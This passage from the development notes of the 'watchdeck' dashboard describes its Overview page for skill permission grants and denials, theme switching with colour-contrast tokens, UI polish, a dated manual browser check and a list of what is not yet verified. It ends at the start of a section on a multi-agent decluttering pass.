- **What needs me?** One item per skill whose request exceeds its grant (`ungranted[]` from `/api/skills`), with its newest denial of the last 7 days if any; each ungranted item shows the exact `watchdeck allow …` line (`predictCommand`, which mirrors `manifest.AllowCommand`) and a Grant button that goes through the Skills page's `confirmGrant` and `postGrant`; an item with no CLI flag (an env variable) says to edit the overrides file. Then one item per other skill with a denial in the last 7 days, linking to its skill and its Flow, with no fix suggested. Denials follow the session catalog's rule: a `deny` decision, a `denied` record, a run with a hint or with an outcome of `policy_error`, `no_sandbox` or `usage`.

Empty states: "All clear" when nothing needs the person; "Nothing yet" or "Activity log is off" for recent activity; skeleton placeholders while the skills, the first activity poll and the session counts load (their shimmer stops under `prefers-reduced-motion`, the existing rule). `overview.js` posts nothing itself (`TestOverviewPageIsHome` fails on an `api.post(` in it).

**Theme.** A button in the top bar cycles auto → light → dark. Auto keeps the dark tokens under `@media (prefers-color-scheme: dark)`, now on `:root:not([data-theme="light"])`; `data-theme="dark"` on `<html>` applies the same tokens whatever the OS says, and `data-theme="light"` opts out of the media query. The choice is a per-browser convenience in `localStorage` (`watchdeck.theme`), read and written inside try/catch; blocked storage means auto. The `--cv-*` canvas tokens are defined once and never themed, so the Flow graph is dark in every theme (`TestThemeTokens`, which also requires the AA-checked dark `--tag-net-bg` in both dark blocks). Two dark-only tokens were added after the dark screenshots: `--link` (#5FD1D8), because the dark accent (#0E7C86) was too dim as link text on dark surfaces, and `--cmd-bg`, because the code background equalled the page background. The accent is #0D7882 in light (4.64:1 as link text on `--bg`) and stays #0E7C86 in dark (Plan 05 Task 7). `app.js` applies the stored theme when the module loads; the CSP allows no inline script in `<head>`, so a forced theme opposite to the OS preference can show the OS theme for a frame while the page loads.

**Polish.** A sticky, translucent top bar with a filled brand mark and an icon on every tab; cards with a soft raise and a hover lift; `card-head` headers; a 0.22 s page fade (not on Flow, whose canvas is measured on mount, since a transform would shift it) and a dialog entrance, both off under `prefers-reduced-motion`. **Enforce** now leads with one status card for the user settings and one primary action (Install hooks, or Finish install when partly installed), the same `enforceChange`; the per-file cards keep their paths and status lines with secondary Install and Uninstall buttons, and "What install writes" folds into a `<details>`.

**Checked by hand (2026-10-14)** in Playwright's Chromium against a fresh fixture home (`scripts/fixture-home.sh`, the binary copied into the fixture dir so no path outside it reaches the settings file), 1280×800: light and dark by the emulated OS preference, and both forced themes against the opposite preference; Not protected → Turn on protection → the dialog named `<fixture>/home/.claude/settings.json` → Install → Protected, with "Hook on" in the header; Overview, Sessions, Flow, Skills, Grants and Enforce with zero console errors or warnings (no CSP violation); an unknown route falls back to `#/overview`.

**Not verified yet (2026-10-14).** Safari and Firefox; the Overview at 390 px (its grids collapse at 1099 and 759 px in CSS; not looked at); a Grant clicked through from the Overview (the same functions as the Skills page, not exercised here); records arriving from a live hook while the Overview is open; a busy log, where the 200-record tail the page loads first can cover less than a day (the tile then says "in the last N records" instead of claiming 24 h).

### Dashboard declutter (2026-10-14)

The owner asked for a dashboard that is "amazing and less cluttered". Four worker subagents each owned a separate set of files: the shell (`app.css`, `index.html`), the Overview (`overview.js`, `overview.css`), Skills, Grants and Enforce (`pages.js`, `pages.css`), and Sessions (`sessions.js`, `sessions.css`). A verifier then ran the tests and walked every page on a fixture home. Routes, element ids, API calls and the grant and enforce write paths did not change. The pass only hides, condenses and reorders.

- **Stylesheets.**
